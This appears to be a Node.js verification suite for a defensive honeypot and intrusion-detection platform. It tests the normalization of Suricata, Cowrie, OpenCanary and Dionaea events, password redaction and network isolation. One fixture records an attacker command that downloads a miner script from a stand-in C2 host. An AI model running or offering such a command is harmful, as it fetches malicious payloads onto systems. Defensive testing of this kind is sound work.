/**
 * Shadow Guard 2.0 - Stage 3 Ingestion & Deception Verification Suite
 * Tests Suricata NIDS EVE JSON normalization, Cowrie/OpenCanary/Dionaea adapters,
 * credential privacy enforcement, honeypot manager registry, and network isolation definitions.
 */

const fs = require('fs');
const path = require('path');
const { validateEvent } = require('../shared/lib/eventContract');
const { normalizeSuricataEvent, mapSuricataSeverity } = require('../suricata-event-collector-service/adapters/suricataAdapter');
const { normalizeCowrieEvent } = require('../honeypot-event-collector-service/adapters/cowrieAdapter');
const { normalizeOpenCanaryEvent } = require('../honeypot-event-collector-service/adapters/opencanaryAdapter');
const { normalizeDionaeaEvent } = require('../honeypot-event-collector-service/adapters/dionaeaAdapter');
const honeypotRegistry = require('../honeypot-manager-service/registry');

let passedTests = 0;
let failedTests = 0;

function assert(condition, testName, details = '') {
  if (condition) {
    console.log(`  ✓ [PASS] ${testName}`);
    passedTests++;
  } else {
    console.error(`  ✗ [FAIL] ${testName}: ${details}`);
    failedTests++;
  }
}

async function runStage3Verification() {
  console.log('='.repeat(70));
  console.log('  SHADOW GUARD 2.0 - STAGE 3 INGESTION & DECEPTION VERIFICATION');
  console.log('='.repeat(70));

  // ── 1. Suricata NIDS EVE JSON Adapter ──────────────────────────────────────
  console.log('\n[1/5] Verifying Suricata NIDS EVE Normalization Across 5 Telemetry Types...');

  // A. Suricata Alert
  const rawAlert = {
    timestamp: '2026-11-13T08:35:00.001Z',
    flow_id: 1234567890,
    in_iface: 'eth0',
    event_type: 'alert',
    src_ip: '198.51.100.25',
    src_port: 54120,
    dest_ip: '192.168.1.100',
    dest_port: 80,
    proto: 'TCP',
    alert: {
      action: 'allowed',
      gid: 1,
      signature_id: 2000001,
      rev: 1,
      signature: 'SG-NIDS Reconnaissance TCP SYN Scan Detected',
      category: 'Attempted Information Leak',
      severity: 1,
      payload_printable: 'GET / HTTP/1.1\r\n'
    },
    flow: { pkts_toserver: 25, pkts_toclient: 0, bytes_toserver: 1200, bytes_toclient: 0, age: 3 }
  };

  const normAlert = normalizeSuricataEvent(rawAlert);
  assert(normAlert.source_domain === 'nids', 'Suricata alert source_domain is nids');
  assert(normAlert.event_type === 'nids.alert', 'Suricata alert event_type is nids.alert');
  assert(normAlert.severity === 'high', 'Severity correctly mapped from Suricata severity 1');
  assert(normAlert.nids_context.signature_id === 2000001, 'Signature ID preserved');
  assert(normAlert.telemetry.source_ip === '198.51.100.25', 'Telemetry source IP preserved');
  assert(validateEvent(normAlert).valid, 'Normalized Suricata alert passes Event Contract v2.0 validation');

  // B. Suricata DNS
  const rawDns = {
    timestamp: '2026-11-13T08:35:02.000Z',
    event_type: 'dns',
    src_ip: '192.168.1.50',
    src_port: 49152,
    dest_ip: '1.1.1.1',
    dest_port: 53,
    proto: 'UDP',
    dns: { type: 'query', rrname: 'c2-beacon.darkops.net', rrtype: 'A', rcode: 'NOERROR', answers: ['198.51.100.99'] }
  };
  const normDns = normalizeSuricataEvent(rawDns);
  assert(normDns.event_type === 'nids.dns', 'Suricata DNS event_type is nids.dns');
  assert(normDns.nids_context.query_name === 'c2-beacon.darkops.net', 'DNS query name captured in nids_context');
  assert(validateEvent(normDns).valid, 'Normalized Suricata DNS passes Event Contract v2.0 validation');

  // C. Suricata HTTP
  const rawHttp = {
    timestamp: '2026-11-13T08:35:04.000Z',
    event_type: 'http',
    src_ip: '203.0.113.10',
    dest_ip: '192.168.1.100',
    dest_port: 80,
    proto: 'TCP',
    http: { hostname: 'target.local', url: '/admin/login', http_method: 'POST', status: 401, http_user_agent: 'sqlmap/1.5' }
  };
  const normHttp = normalizeSuricataEvent(rawHttp);
  assert(normHttp.event_type === 'nids.http', 'Suricata HTTP event_type is nids.http');
  assert(normHttp.nids_context.url === '/admin/login', 'HTTP url captured in nids_context');
  assert(validateEvent(normHttp).valid, 'Normalized Suricata HTTP passes Event Contract v2.0 validation');

  // D. Suricata TLS
  const rawTls = {
    timestamp: '2026-11-13T08:35:06.000Z',
    event_type: 'tls',
    src_ip: '192.168.1.75',
    dest_ip: '104.21.45.67',
    dest_port: 443,
    proto: 'TCP',
    tls: { sni: 'api.exfil-service.org', version: 'TLS 1.3', ja3: '771,4865-4866-4867,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,29-23-24,0' }
  };
  const normTls = normalizeSuricataEvent(rawTls);
  assert(normTls.event_type === 'nids.tls', 'Suricata TLS event_type is nids.tls');
  assert(normTls.nids_context.sni === 'api.exfil-service.org', 'TLS SNI captured in nids_context');
  assert(validateEvent(normTls).valid, 'Normalized Suricata TLS passes Event Contract v2.0 validation');

  // E. Suricata Flow
  const rawFlow = {
    timestamp: '2026-11-13T08:35:08.000Z',
    event_type: 'flow',
    src_ip: '192.168.1.10',
    dest_ip: '8.8.8.8',
    proto: 'UDP',
    flow: { pkts_toserver: 10, pkts_toclient: 10, bytes_toserver: 512, bytes_toclient: 512, age: 1.5, state: 'closed' }
  };
  const normFlow = normalizeSuricataEvent(rawFlow);
  assert(normFlow.event_type === 'nids.flow', 'Suricata Flow event_type is nids.flow');
  assert(normFlow.telemetry.packet_count === 20, 'Flow packet count calculated');
  assert(validateEvent(normFlow).valid, 'Normalized Suricata Flow passes Event Contract v2.0 validation');

  // ── 2. Cowrie Honeypot Adapter & Credential Privacy ───────────────────────
  console.log('\n[2/5] Verifying Cowrie Honeypot Adapter & Privacy Enforcement...');

  const rawCowrieLoginFailed = {
    eventid: 'cowrie.login.failed',
    timestamp: '2026-11-13T08:35:10.000Z',
    src_ip: '198.51.100.89',
    src_port: 44120,
    dst_port: 2222,
    session: 'session-9912',
    username: 'root',
    password: 'SuperSecretPassword123!', // SENSITIVE: MUST BE STRIPPED
    version: 'SSH-2.0-libssh_0.9.0'
  };

  const normCowrie = normalizeCowrieEvent(rawCowrieLoginFailed);
  assert(normCowrie.source_domain === 'deception', 'Cowrie source_domain is deception');
  assert(normCowrie.event_type === 'honeypot.auth.failed', 'Cowrie login failure maps to honeypot.auth.failed');
  assert(normCowrie.deception_context.username === 'root', 'Username preserved');
  assert(normCowrie.deception_context.auth_outcome === 'FAILED', 'auth_outcome is FAILED');

  // CRITICAL PRIVACY CHECKS: Ensure zero password leakage
  assert(normCowrie.deception_context.password === undefined, 'PRIVACY: raw password strictly omitted from deception_context');
  assert(normCowrie.deception_context.password_hash === undefined, 'PRIVACY: password hash strictly omitted');
  assert(JSON.stringify(normCowrie).indexOf('SuperSecretPassword123!') === -1, 'PRIVACY: plain password does not appear anywhere in serialized JSON');
  assert(validateEvent(normCowrie).valid, 'Normalized Cowrie event passes Event Contract v2.0 validation');

  // Command Execution Event
  const rawCowrieCmd = {
    eventid: 'cowrie.command.input',
    src_ip: '198.51.100.89',
    dst_port: 2222,
    session: 'session-9912',
    input: 'curl -O http://c2.badsite.com/miner.sh'
  };
  const normCowrieCmd = normalizeCowrieEvent(rawCowrieCmd);
  assert(normCowrieCmd.event_type === 'honeypot.command.executed', 'Command input maps to honeypot.command.executed');
  assert(normCowrieCmd.deception_context.command_executed === 'curl -O http://c2.badsite.com/miner.sh', 'Command input captured');

  // File Download Event
  const rawCowrieDownload = {
    eventid: 'cowrie.session.file_download',
    src_ip: '198.51.100.89',
    dst_port: 2222,
    session: 'session-9912',
    url: 'http://c2.badsite.com/miner.sh',
    shasum: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
  };
  const normCowrieDownload = normalizeCowrieEvent(rawCowrieDownload);
  assert(normCowrieDownload.event_type === 'honeypot.file.downloaded', 'File download maps to honeypot.file.downloaded');
  assert(normCowrieDownload.severity === 'critical', 'Payload download is marked critical');
  assert(normCowrieDownload.deception_context.download_sha256 !== null, 'Payload SHA-256 hash captured');

  // ── 3. OpenCanary Multi-Decoy & Dionaea Adapters ───────────────────────────
  console.log('\n[3/5] Verifying OpenCanary Multi-Decoy & Dionaea Adapters...');

  // OpenCanary HTTP Probe
  const rawCanaryHttp = {
    node_id: 'opencanary-01',
    utc_time: '2026-11-13 08:35:12.123456',
    logtype: 2000,
    src_host: '203.0.113.88',
    src_port: 33412,
    dst_host: '192.168.1.160',
    dst_port: 8080,
    logdata: { PATH: '/wp-login.php', USERAGENT: 'Mozilla/5.0 (Scanner)' }
  };
  const normCanaryHttp = normalizeOpenCanaryEvent(rawCanaryHttp);
  assert(normCanaryHttp.event_type === 'honeypot.http.probe', 'OpenCanary logtype 2000 maps to honeypot.http.probe');
  assert(normCanaryHttp.deception_context.decoy_type === 'http', 'Decoy type is http');
  assert(normCanaryHttp.deception_context.probe_path === '/wp-login.php', 'Probe path captured');
  assert(validateEvent(normCanaryHttp).valid, 'Normalized OpenCanary HTTP event passes validation');

  // OpenCanary MySQL Probe
  const rawCanaryMysql = {
    node_id: 'opencanary-01',
    logtype: 5001,
    src_host: '203.0.113.88',
    dst_port: 3306,
    logdata: { USERNAME: 'root', PASSWORD: 'PasswordUnsafe!' } // SENSITIVE MUST BE STRIPPED
  };
  const normCanaryMysql = normalizeOpenCanaryEvent(rawCanaryMysql);
  assert(normCanaryMysql.event_type === 'honeypot.mysql.probe', 'OpenCanary logtype 5001 maps to honeypot.mysql.probe');
  assert(normCanaryMysql.deception_context.username === 'root', 'MySQL username captured');
  assert(JSON.stringify(normCanaryMysql).indexOf('PasswordUnsafe!') === -1, 'PRIVACY: MySQL password strictly omitted');

  // Dionaea Malware Decoy
  const rawDionaea = {
    timestamp: '2026-11-13T08:35:15.000Z',
    src_ip: '198.51.100.99',
    dst_port: 445,
    service: 'smb',
    download: true,
    sha256: '2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae',
    quarantine_path: '/quarantine/bin-4412.exe'
  };
  const normDionaea = normalizeDionaeaEvent(rawDionaea);
  assert(normDionaea.event_type === 'honeypot.malware.downloaded', 'Dionaea download maps to honeypot.malware.downloaded');
  assert(normDionaea.deception_context.download_sha256.length === 64, 'SHA-256 hash captured');
  assert(validateEvent(normDionaea).valid, 'Dionaea event passes validation');

  // ── 4. Honeypot Manager Registry ──────────────────────────────────────────
  console.log('\n[4/5] Verifying Honeypot Manager Registry...');

  const allDecoys = honeypotRegistry.listAll();
  assert(allDecoys.length >= 4, 'Honeypot Manager registers at least 4 default decoys');

  const cowrieSsh = honeypotRegistry.getById('hp-cowrie-ssh-01');
  assert(cowrieSsh && cowrieSsh.ports.includes(2222), 'Cowrie SSH registered on port 2222');

  const openCanary = honeypotRegistry.getById('hp-opencanary-multi-01');
  assert(openCanary && openCanary.ports.includes(8080) && openCanary.ports.includes(3306), 'OpenCanary registered on ports 8080 & 3306');

  // Test Toggle
  honeypotRegistry.toggleStatus('hp-cowrie-telnet-01', false);
  const toggled = honeypotRegistry.getById('hp-cowrie-telnet-01');
  assert(toggled.status === 'disabled', 'Honeypot status toggle works');
  honeypotRegistry.toggleStatus('hp-cowrie-telnet-01', true); // Re-enable

  const activePorts = honeypotRegistry.getActivePorts();
  assert(activePorts[2222] !== undefined, 'Active decoy ports map includes port 2222');
  assert(activePorts[8080] !== undefined, 'Active decoy ports map includes port 8080');

  // ── 5. Docker Compose Network Isolation & Volume Topology ─────────────────
  console.log('\n[5/5] Verifying Docker Compose Network Boundaries & Volumes...');

  const composeContent = fs.readFileSync(path.join(__dirname, '..', 'docker-compose.yml'), 'utf8');

  assert(composeContent.includes('suricata:'), 'docker-compose declares suricata service');
  assert(composeContent.includes('suricata-event-collector-service:'), 'docker-compose declares suricata-event-collector-service');
  assert(composeContent.includes('cowrie:'), 'docker-compose declares cowrie service');
  assert(composeContent.includes('opencanary:'), 'docker-compose declares opencanary service');
  assert(composeContent.includes('honeypot-event-collector-service:'), 'docker-compose declares honeypot-event-collector-service');
  assert(composeContent.includes('honeypot-manager-service:'), 'docker-compose declares honeypot-manager-service');

  // Network DMZ assertions
  assert(composeContent.includes('sg_deception_dmz'), 'docker-compose defines sg_deception_dmz network');
  assert(composeContent.includes('suricata_logs:'), 'docker-compose declares suricata_logs volume');
  assert(composeContent.includes('cowrie_logs:'), 'docker-compose declares cowrie_logs volume');
  assert(composeContent.includes('opencanary_logs:'), 'docker-compose declares opencanary_logs volume');

  // Summary
  console.log('\n' + '='.repeat(70));
  console.log(`STAGE 3 DECEPTION TEST RESULTS: ${passedTests} PASSED, ${failedTests} FAILED`);
  console.log('='.repeat(70));

  if (failedTests > 0) {
    process.exit(1);
  }
}

runStage3Verification().catch((err) => {
  console.error('Unexpected error running verification:', err);
  process.exit(1);
});
